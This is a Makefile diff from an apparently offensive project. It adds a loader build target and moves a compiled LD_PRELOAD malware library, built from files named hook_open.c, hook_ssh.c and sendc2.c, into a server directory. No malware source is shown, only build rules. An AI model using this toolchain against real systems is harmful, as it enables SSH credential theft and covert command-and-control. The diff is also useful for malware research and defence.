@@ -14,9 +14,11 @@ ARG_MALWARE = ldpreload_malware/malware/hook_open.c \
               ldpreload_malware/malware/hook_ssh.c \
               ldpreload_malware/malware/sendc2.c
 
-.PHONY: all db server malware clean
+ARG_LOADER = ldpreload_malware/loader/loader.c
 
-all: db server malware
+.PHONY: all db server malware loader clean
+
+all: db server malware loader
 	@echo "[+] Build complete."
 
 db:
@@ -29,7 +31,12 @@ server:
 
 malware:
 	@echo "[*] Compiling LD_PRELOAD malware..."
-	@$(CC) $(CFLAGS) $(ARG_MALWARE) -fPIC -shared -o ldpreload_malware/malware.so
+	@$(CC) $(CFLAGS) $(ARG_MALWARE) -fPIC -shared -o server/malware.so
+
+loader:
+	@echo "[*] Compiling Loader malware..."
+	@$(CC) $(CFLAGS) $(ARG_LOADER) $(LDFLAGS) -o ldpreload_malware/loader/loader
+	
 
 clean:
 	@echo "[*] Cleaning all built files..."
